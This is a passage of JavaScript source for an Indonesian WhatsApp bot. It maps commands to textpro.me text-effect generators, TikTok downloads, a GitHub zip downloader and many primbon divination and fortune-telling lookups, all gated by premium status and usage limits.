             if (/holographic/.test(command)) link = 'https://textpro.me/holographic-3d-text-effect-975.html'
             if (/3davengers/.test(command)) link = 'https://textpro.me/create-3d-avengers-logo-online-974.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/greenneon/.test(command)) link = 'https://textpro.me/green-neon-text-effect-874.html'
             if (/lion2/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
             if (/3dbox/.test(command)) link = 'https://textpro.me/3d-box-text-effect-online-880.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/karbon/.test(command)) link = 'https://textpro.me/carbon-text-effect-833.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
             if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
             let anu = await maker.textpro(link, q)
             dica.sendMessage(m.chat, { image: { url: anu }, caption: `Done | Follow Ig : @dica_yt1` }, { quoted: m })
             }
             break
             case 'glitch2': case 'harrypot': case 'graffiti': case 'pornhub': case 'glitch3': case '3dspace': case 'lion': case 'wolf': case 'retro': case '8bit': {
             if(!q) return m.reply(`Use ${prefix + command} text1|text2`)
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
             m.reply(mess.wait)
             teks1 = q.split("|")[0]
             teks2 = q.split("|")[1]
             let link
             if (/glitch3/.test(command)) link = 'https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html'
             if (/harrypot/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/graffiti/.test(command)) link = 'https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html'
             if (/pornhub/.test(command)) link = 'https://textpro.me/pornhub-style-logo-online-generator-free-977.html'
             if (/glitch2/.test(command)) link = 'https://textpro.me/create-a-glitch-text-effect-online-free-1026.html'
             if (/3dspace/.test(command)) link = 'https://textpro.me/create-space-3d-text-effect-online-985.html'
             if (/lion/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
             if (/wolf/.test(command)) link = 'https://textpro.me/create-wolf-logo-galaxy-online-936.html'
             if (/retro/.test(command)) link = 'https://textpro.me/create-3d-retro-text-effect-online-free-1065.html'
             if (/8bit/.test(command)) link = 'https://textpro.me/video-game-classic-8-bit-text-effect-1037.html'
             let anu = await maker.textpro(link, [`${teks1}`,`${teks2}`])
             dica.sendMessage(m.chat, { image: { url: anu }, caption: `Made by dica` }, { quoted: m })
             }
             break
//━━━━━━━━━━━━━━━[ BATAS 

case 'tt': case 'tiktok]':{ 
if (!text) return m.reply( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
    var button = [{ buttonId: `tiktokaudio`, buttonText: { displayText: `AUDIO` }, type: 1 }, { buttonId: `owner`, buttonText: { displayText: `OWNER` }, type: 1 }]
dica.sendMessage(m.chat, { caption: 'Tu Video Nya | Jangan Lupa Follow @dica_yt1', video: { url: data.watermark }, buttons: button, footer: `© Kilaaa`, mentions: [sender] })
})
}
break
case 'ttmp3': case 'ttaudio': case 'tiktokaudio':{
if (!text) return m.reply( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
dica.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
//BATAS NYA DECK//
//━━━━━━━━━━━━━━━[ WEBZONE ]━━━━━━━━━━━━━━━━━//
//━━━━━━━━━━━━━━━[ RANDOM ASUPAN ]━━━━━━━━━━━━━━━━━//
case 'storyanime':
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var storyanime = JSON.parse(fs.readFileSync('./storage/video/storyanime.js'))
var hasil = pickRandom(storyanime)
dica.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
break
//━━━━━━━━━━━━━━━[ BATAS ]━━━━━━━━━━━━━━━━━//
         case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Contoh : ${prefix + command} 6285822347348`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Contoh : ${prefix + command} belanja`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Contoh : ${prefix + command} Dica`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Contoh : ${prefix + command} Dika, 7, 7, 2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Contoh : ${prefix + command} Dika|Novia`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Contoh : ${prefix + command} 6, 12, 2020`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Contoh : ${prefix+ command} 28, 12, 2021`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Contoh : ${prefix + command} 7, 7, 2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Contoh : ${prefix + command} 7, 7, 2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Contoh❗:\n${prefix + command} 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Contoh : ${prefix + command} 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
case 'jadibot': {
if (!isPremium) return sendButMessage (m.chat, prem1, prem2, prem3, { quoted:m})
jadibot(dica, m, m.chat)
}
break
case 'listjadibot':
try {
let user = [... new Set([...global.conns.filter(dica => dica.user).map(dica => dica.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
let y = await dica.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
dica.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`Belum Ada User Yang Jadibot`)
}
break
case 'git': case 'gitclone':
if (!args[0]) return m.reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)

if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    dica.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Contoh : ${prefix + command} 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Contoh : ${prefix + command} Dika,1,2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Contoh : ${prefix + command} 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Contoh : ${prefix + command} 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Contoh : ${prefix + command} 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Contoh : ${prefix + command} 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Contoh : ${prefix + command} 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Contoh : ${prefix + command} DIka,7,7,2005,2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Contoh : ${prefix + command} 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Contoh : ${prefix + command} Dika, 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Contoh : ${prefix + command} Dika, 7,7,2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Contoh : ${prefix + command} 12,1,2022`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Contoh : ${prefix + command} 12,1,2022,28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Contoh : ${prefix+ command} 7 7 2005`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
